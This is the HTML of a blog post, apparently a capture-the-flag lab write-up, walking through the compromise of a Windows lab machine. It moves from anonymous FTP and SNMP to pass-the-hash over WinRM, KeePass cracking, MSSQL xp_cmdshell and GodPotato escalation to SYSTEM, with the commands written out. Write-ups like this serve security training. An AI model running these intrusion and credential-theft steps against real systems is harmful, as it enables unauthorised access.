@@ -1,0 +1,455 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Matrioska - Complete Penetration Testing WalkthroughIntroductionThis is a complete walkthrough and writeup for the Matrioska machine from the Ronin66 lab — and the name fits perfectly. Every layer you">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Ronin66-Matrioska">
+<meta property="og:url" content="https://panosoikogr.github.io/2026/09/18/Ronin66-Matrioska/index.html">
+<meta property="og:site_name" content="Panosoiko Cybersecurity Blog">
+<meta property="og:description" content="Matrioska - Complete Penetration Testing WalkthroughIntroductionThis is a complete walkthrough and writeup for the Matrioska machine from the Ronin66 lab — and the name fits perfectly. Every layer you">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Matrioska/snmpwalk-creds.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Matrioska/share-acess.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Matrioska/cracked.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Matrioska/admin-creds.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Matrioska/system.png">
+<meta property="article:published_time" content="2026-09-18T13:03:05.000Z">
+<meta property="article:modified_time" content="2026-09-18T13:03:23.933Z">
+<meta property="article:author" content="Panosoiko">
+<meta property="article:tag" content="MSSQL">
+<meta property="article:tag" content="Ronin66">
+<meta property="article:tag" content="Windows">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://panosoikogr.github.io/images/Matrioska/snmpwalk-creds.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/android-chrome-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Ronin66-Matrioska</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-73BMC8ZHB7"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-73BMC8ZHB7');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2026/09/17/Ronin66-Recovery/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2026/09/18/Ronin66-Matrioska/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2026/09/18/Ronin66-Matrioska/&text=Ronin66-Matrioska"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2026/09/18/Ronin66-Matrioska/&title=Ronin66-Matrioska"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2026/09/18/Ronin66-Matrioska/&is_video=false&description=Ronin66-Matrioska"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Ronin66-Matrioska&body=Check out this article: https://panosoikogr.github.io/2026/09/18/Ronin66-Matrioska/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2026/09/18/Ronin66-Matrioska/&title=Ronin66-Matrioska"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2026/09/18/Ronin66-Matrioska/&title=Ronin66-Matrioska"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2026/09/18/Ronin66-Matrioska/&title=Ronin66-Matrioska"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2026/09/18/Ronin66-Matrioska/&title=Ronin66-Matrioska"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2026/09/18/Ronin66-Matrioska/&name=Ronin66-Matrioska&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2026/09/18/Ronin66-Matrioska/&t=Ronin66-Matrioska"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Matrioska-Complete-Penetration-Testing-Walkthrough"><span class="toc-number">1.</span> <span class="toc-text">Matrioska - Complete Penetration Testing Walkthrough</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Enumeration"><span class="toc-number">1.2.</span> <span class="toc-text">Initial Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan"><span class="toc-number">1.2.1.</span> <span class="toc-text">Nmap Scan</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Layer-1-%E2%80%94-FTP-%E2%86%92-SNMP-Community-String"><span class="toc-number">1.3.</span> <span class="toc-text">Layer 1 — FTP → SNMP Community String</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Anonymous-FTP"><span class="toc-number">1.3.1.</span> <span class="toc-text">Anonymous FTP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SNMP-Walk"><span class="toc-number">1.3.2.</span> <span class="toc-text">SNMP Walk</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Layer-2-%E2%80%94-SMB-%E2%86%92-Backup-ZIP-%E2%86%92-Hash"><span class="toc-number">1.4.</span> <span class="toc-text">Layer 2 — SMB → Backup ZIP → Hash</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Share-Enumeration"><span class="toc-number">1.4.1.</span> <span class="toc-text">Share Enumeration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RID-Brute-Force-and-Password-Spray"><span class="toc-number">1.4.2.</span> <span class="toc-text">RID Brute Force and Password Spray</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Offline-secretsdump-from-the-Backup-ZIP"><span class="toc-number">1.4.3.</span> <span class="toc-text">Offline secretsdump from the Backup ZIP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Layer-3-%E2%80%94-WinRM-%E2%86%92-KeePass-%E2%86%92-Recycle-Bin"><span class="toc-number">1.5.</span> <span class="toc-text">Layer 3 — WinRM → KeePass → Recycle Bin</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WinRM-as-Dean"><span class="toc-number">1.5.1.</span> <span class="toc-text">WinRM as Dean</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cracking-Database-kdbx"><span class="toc-number">1.5.2.</span> <span class="toc-text">Cracking Database.kdbx</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Recycle-Bin-%E2%80%94-A-Second-Database"><span class="toc-number">1.5.3.</span> <span class="toc-text">Recycle Bin — A Second Database</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cracking-database2-kdbx-with-john"><span class="toc-number">1.5.4.</span> <span class="toc-text">Cracking database2.kdbx with john</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Layer-4-%E2%80%94-MSSQL-%E2%86%92-xp-cmdshell-%E2%86%92-SYSTEM"><span class="toc-number">1.6.</span> <span class="toc-text">Layer 4 — MSSQL → xp_cmdshell → SYSTEM</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Connecting-to-MSSQL"><span class="toc-number">1.6.1.</span> <span class="toc-text">Connecting to MSSQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Enabling-xp-cmdshell"><span class="toc-number">1.6.2.</span> <span class="toc-text">Enabling xp_cmdshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GodPotato-%E2%86%92-SYSTEM"><span class="toc-number">1.6.3.</span> <span class="toc-text">GodPotato → SYSTEM</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">1.7.</span> <span class="toc-text">Conclusion</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tools-Used"><span class="toc-number">1.8.</span> <span class="toc-text">Tools Used</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Ronin66-Matrioska
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Panosoiko</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2026-09-18T13:03:05.000Z" class="dt-published" itemprop="datePublished">2026-09-18</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/MSSQL/" rel="tag">MSSQL</a>, <a class="p-category" href="/tags/Ronin66/" rel="tag">Ronin66</a>, <a class="p-category" href="/tags/Windows/" rel="tag">Windows</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="Matrioska-Complete-Penetration-Testing-Walkthrough"><a href="#Matrioska-Complete-Penetration-Testing-Walkthrough" class="headerlink" title="Matrioska - Complete Penetration Testing Walkthrough"></a>Matrioska - Complete Penetration Testing Walkthrough</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>This is a complete walkthrough and writeup for the <strong>Matrioska</strong> machine from the Ronin66 lab — and the name fits perfectly. Every layer you peel back reveals another credential hiding underneath: an SNMP string in an FTP log, SMB creds from SNMP output, a hash from a ZIP backup, a KeePass database in the Recycle Bin, and finally MSSQL credentials that hand us SYSTEM. One box, five credential layers.</p>
+<p><strong>Tools Used:</strong> Nmap, ftp, snmpwalk, NetExec, smbclient, impacket-secretsdump, Evil-WinRM, keepass4brute, john (bleeding-edge), KeePassXC, impacket-mssqlclient, GodPotato</p>
+<p><strong>Difficulty:</strong> Hard</p>
+<p><strong>Key Techniques:</strong> Anonymous FTP, SNMP community string discovery, SNMP credential leak, SMB share enumeration, offline secretsdump from backup ZIP, Pass-the-Hash, KeePass cracking (john), MSSQL xp_cmdshell, SeImpersonatePrivilege (GodPotato)</p>
+<p><strong>Environment:</strong></p>
+<ul>
+<li>Machine: <code>MTK161</code></li>
+<li>IP: <code>172.16.18.11</code></li>
+</ul>
+<hr>
+<h2 id="Initial-Enumeration"><a href="#Initial-Enumeration" class="headerlink" title="Initial Enumeration"></a>Initial Enumeration</h2><h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><p>We begin with a full service scan:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sV -sC 172.16.18.11 -p- -vvvv</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">21/tcp    open  ftp           Microsoft ftpd</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed</span><br><span class="line">|_07-27-25  11:58AM       &lt;DIR&gt;  logs</span><br><span class="line">80/tcp    open  http          Microsoft IIS httpd 10.0</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)</span><br><span class="line">50668/tcp open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RTM</span><br></pre></td></tr></table></figure>
+
+<p>Several surfaces to work with:</p>
+<ul>
+<li><strong>Port 21</strong>: FTP with <strong>anonymous login allowed</strong> — always the first stop</li>
+<li><strong>Port 445</strong>: SMB</li>
+<li><strong>Port 5985</strong>: WinRM — useful once we have credentials</li>
+<li><strong>Port 50668</strong>: MSSQL 2022 on a non-standard port</li>
+</ul>
+<hr>
+<h2 id="Layer-1-—-FTP-→-SNMP-Community-String"><a href="#Layer-1-—-FTP-→-SNMP-Community-String" class="headerlink" title="Layer 1 — FTP → SNMP Community String"></a>Layer 1 — FTP → SNMP Community String</h2><h3 id="Anonymous-FTP"><a href="#Anonymous-FTP" class="headerlink" title="Anonymous FTP"></a>Anonymous FTP</h3><p>Anonymous FTP is open and there’s a <code>logs</code> directory. We log in and pull everything:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp 172.16.18.11</span><br></pre></td></tr></table></figure>
+
+<p>Inside we find <code>last_2025.txt</code>. It contains an SNMP community string:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SNMP: &lt;REDACTED&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="SNMP-Walk"><a href="#SNMP-Walk" class="headerlink" title="SNMP Walk"></a>SNMP Walk</h3><p>We use the community string to query SNMP on the host:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">snmpwalk -v2c -c &lt;REDACTED&gt; 172.16.18.11</span><br></pre></td></tr></table></figure>
+
+<p>One of the first things returned is a plaintext credential for the user <strong>svc_smb</strong>.</p>
+<p><img src="/images/Matrioska/snmpwalk-creds.png" alt="snmpwalk-creds"></p>
+<hr>
+<h2 id="Layer-2-—-SMB-→-Backup-ZIP-→-Hash"><a href="#Layer-2-—-SMB-→-Backup-ZIP-→-Hash" class="headerlink" title="Layer 2 — SMB → Backup ZIP → Hash"></a>Layer 2 — SMB → Backup ZIP → Hash</h2><h3 id="Share-Enumeration"><a href="#Share-Enumeration" class="headerlink" title="Share Enumeration"></a>Share Enumeration</h3><p>With <code>svc_smb</code>‘s credentials we enumerate available SMB shares:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 172.16.18.11 -u &#x27;svc_smb&#x27; -p &#x27;&lt;REDACTED&gt;&#x27; --shares</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Matrioska/share-acess.png" alt="share-acess"></p>
+<p>There’s a readable <strong>TMP</strong> share. We connect and explore:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //172.16.18.11/TMP -U &#x27;MTK161\svc_smb%&lt;REDACTED&gt;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>Inside the share we find two things worth grabbing: a <code>secrets.txt</code> with a list of passwords and a <code>win11base.zip</code> that looks like a Windows backup.</p>
+<h3 id="RID-Brute-Force-and-Password-Spray"><a href="#RID-Brute-Force-and-Password-Spray" class="headerlink" title="RID Brute Force and Password Spray"></a>RID Brute Force and Password Spray</h3><p>We pull the local user list via RID enumeration:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 172.16.18.11 -u &#x27;svc_smb&#x27; -p &#x27;&lt;REDACTED&gt;&#x27; --rid</span><br></pre></td></tr></table></figure>
+
+<p>We spray the passwords from <code>secrets.txt</code> — none land on <strong>Dean</strong>.</p>
+<h3 id="Offline-secretsdump-from-the-Backup-ZIP"><a href="#Offline-secretsdump-from-the-Backup-ZIP" class="headerlink" title="Offline secretsdump from the Backup ZIP"></a>Offline secretsdump from the Backup ZIP</h3><p>We extract <code>win11base.zip</code> and run <code>impacket-secretsdump</code> against the SAM&#x2F;SYSTEM&#x2F;SECURITY hive files inside it:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump -sam System32/config/SAM -system System32/config/SYSTEM -security System32/config/SECURITY LOCAL</span><br></pre></td></tr></table></figure>
+
+<p>The dump returns hashes for <strong>Administrator</strong> and <strong>Sam</strong>. The Administrator hash doesn’t authenticate, but passing it for <strong>Dean</strong> works — the hash was reused:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 172.16.18.11 -u &#x27;dean&#x27; -H &#x27;&lt;REDACTED&gt;&#x27;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Layer-3-—-WinRM-→-KeePass-→-Recycle-Bin"><a href="#Layer-3-—-WinRM-→-KeePass-→-Recycle-Bin" class="headerlink" title="Layer 3 — WinRM → KeePass → Recycle Bin"></a>Layer 3 — WinRM → KeePass → Recycle Bin</h2><h3 id="WinRM-as-Dean"><a href="#WinRM-as-Dean" class="headerlink" title="WinRM as Dean"></a>WinRM as Dean</h3><p>With Dean’s hash confirmed we open a WinRM session and grab the user flag:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 172.16.18.11 -u &#x27;dean&#x27; -H &#x27;&lt;REDACTED&gt;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>We land in <code>C:\Users\Dean\Documents</code> and immediately spot a KeePass database:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">download Database.kdbx</span><br></pre></td></tr></table></figure>
+
+<h3 id="Cracking-Database-kdbx"><a href="#Cracking-Database-kdbx" class="headerlink" title="Cracking Database.kdbx"></a>Cracking Database.kdbx</h3><p>We try to crack it with <strong>keepass4brute</strong> and rockyou — it doesn’t crack. Dead end on that file.</p>
+<h3 id="Recycle-Bin-—-A-Second-Database"><a href="#Recycle-Bin-—-A-Second-Database" class="headerlink" title="Recycle Bin — A Second Database"></a>Recycle Bin — A Second Database</h3><p>We dig through the Recycle Bin and find another KeePass database:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ls -force</span><br><span class="line">cd $Recycle.Bin</span><br><span class="line">cd S-1-5-21-1990608512-1549956336-3991441458-1001</span><br><span class="line">copy &#x27;$RRQIR9O.kdbx&#x27; C:\Users\Dean\Documents\database2.kdbx</span><br><span class="line">download C:\Users\Dean\Documents\database2.kdbx</span><br></pre></td></tr></table></figure>
+
+<h3 id="Cracking-database2-kdbx-with-john"><a href="#Cracking-database2-kdbx-with-john" class="headerlink" title="Cracking database2.kdbx with john"></a>Cracking database2.kdbx with john</h3><p>The Recycle Bin copy cracks where the first one didn’t. We build the bleeding-edge version of john (the one in Parrot’s repos is too old for KeePass support):</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install -y build-essential libssl-dev zlib1g-dev yasm libgmp-dev libpcap-dev libbz2-dev</span><br><span class="line">git clone https://github.com/openwall/john.git john-bleeding</span><br><span class="line">cd john-bleeding/src &amp;&amp; ./configure &amp;&amp; make -sj$(nproc)</span><br></pre></td></tr></table></figure>
+
+<p>We convert the database to a crackable hash and run it against rockyou:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~/john-bleeding/run/keepass2john database2.kdbx &gt; keepass.hash</span><br><span class="line">~/john-bleeding/run/john --format=keepass --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Matrioska/cracked.png" alt="cracked"></p>
+<p>The password cracks. We open the database:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keepassxc database2.kdbx</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Matrioska/admin-creds.png" alt="admin-creds"></p>
+<p>Inside we find three credential sets:</p>
+<ul>
+<li>A VPN admin account</li>
+<li><strong><code>sa</code></strong> credentials for MSSQL</li>
+<li>An additional admin credential</li>
+</ul>
+<hr>
+<h2 id="Layer-4-—-MSSQL-→-xp-cmdshell-→-SYSTEM"><a href="#Layer-4-—-MSSQL-→-xp-cmdshell-→-SYSTEM" class="headerlink" title="Layer 4 — MSSQL → xp_cmdshell → SYSTEM"></a>Layer 4 — MSSQL → xp_cmdshell → SYSTEM</h2><h3 id="Connecting-to-MSSQL"><a href="#Connecting-to-MSSQL" class="headerlink" title="Connecting to MSSQL"></a>Connecting to MSSQL</h3><p>MSSQL is on the non-standard port <code>50668</code>. We connect as <code>sa</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-mssqlclient sa@172.16.18.11 -port 50668</span><br></pre></td></tr></table></figure>
+
+<h3 id="Enabling-xp-cmdshell"><a href="#Enabling-xp-cmdshell" class="headerlink" title="Enabling xp_cmdshell"></a>Enabling xp_cmdshell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enable_xp_cmdshell</span><br></pre></td></tr></table></figure>
+
+<p>We check our context:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xp_cmdshell whoami</span><br></pre></td></tr></table></figure>
+
+<p>We’re running as <code>NT SERVICE\MSSQL$SQLEXPRESS</code> — a service account with <strong>SeImpersonatePrivilege</strong>. GodPotato is the natural move.</p>
+<h3 id="GodPotato-→-SYSTEM"><a href="#GodPotato-→-SYSTEM" class="headerlink" title="GodPotato → SYSTEM"></a>GodPotato → SYSTEM</h3><p>We upload GodPotato and verify we reach SYSTEM:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">upload /home/panosoiko/Tools/GodPotato-NET4.exe C:/Users/Public/GodPotato-NET4.exe</span><br><span class="line">xp_cmdshell C:/Users/Public/GodPotato-NET4.exe -cmd &quot;cmd /c whoami&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Matrioska/system.png" alt="system"></p>
+<p><code>NT AUTHORITY\SYSTEM</code> confirmed. We grab the root flag directly:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xp_cmdshell C:/Users/Public/GodPotato-NET4.exe -cmd &quot;cmd /c type C:\Users\Administrator\Desktop\root.flg&quot;</span><br></pre></td></tr></table></figure>
+
+<p>Both flags captured.</p>
+<hr>
+<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>Matrioska earns its name — each layer of the box hides another credential inside the previous one:</p>
+<ol>
+<li><strong>Anonymous FTP</strong> — a log file with an SNMP community string</li>
+<li><strong>SNMP walk</strong> — plaintext credentials for <code>svc_smb</code> in the MIB output</li>
+<li><strong>SMB share</strong> — a Windows backup ZIP with registry hives; offline secretsdump recovers Dean’s hash via reuse</li>
+<li><strong>WinRM as Dean</strong> — a KeePass database, but the right one was in the Recycle Bin; john cracks it</li>
+<li><strong>KeePass</strong> — <code>sa</code> credentials for MSSQL; <code>xp_cmdshell</code> + <code>SeImpersonatePrivilege</code> + GodPotato &#x3D; SYSTEM</li>
+</ol>
+<p>The lesson: credentials at rest are a persistent problem. SNMP community strings in log files, passwords in SMB shares, hashes in backup ZIPs, and secrets in deleted KeePass databases — every one of these should be a finding in a real engagement.</p>
+<h2 id="Tools-Used"><a href="#Tools-Used" class="headerlink" title="Tools Used"></a>Tools Used</h2><ul>
+<li>Nmap</li>
+<li>ftp</li>
+<li>snmpwalk</li>
+<li>NetExec</li>
+<li>smbclient</li>
+<li>impacket-secretsdump</li>
+<li>Evil-WinRM</li>
+<li>keepass4brute</li>
+<li>john (bleeding-edge)</li>
+<li>KeePassXC</li>
+<li>impacket-mssqlclient</li>
+<li>GodPotato</li>
+</ul>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writeups</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Matrioska-Complete-Penetration-Testing-Walkthrough"><span class="toc-number">1.</span> <span class="toc-text">Matrioska - Complete Penetration Testing Walkthrough</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Enumeration"><span class="toc-number">1.2.</span> <span class="toc-text">Initial Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan"><span class="toc-number">1.2.1.</span> <span class="toc-text">Nmap Scan</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Layer-1-%E2%80%94-FTP-%E2%86%92-SNMP-Community-String"><span class="toc-number">1.3.</span> <span class="toc-text">Layer 1 — FTP → SNMP Community String</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Anonymous-FTP"><span class="toc-number">1.3.1.</span> <span class="toc-text">Anonymous FTP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SNMP-Walk"><span class="toc-number">1.3.2.</span> <span class="toc-text">SNMP 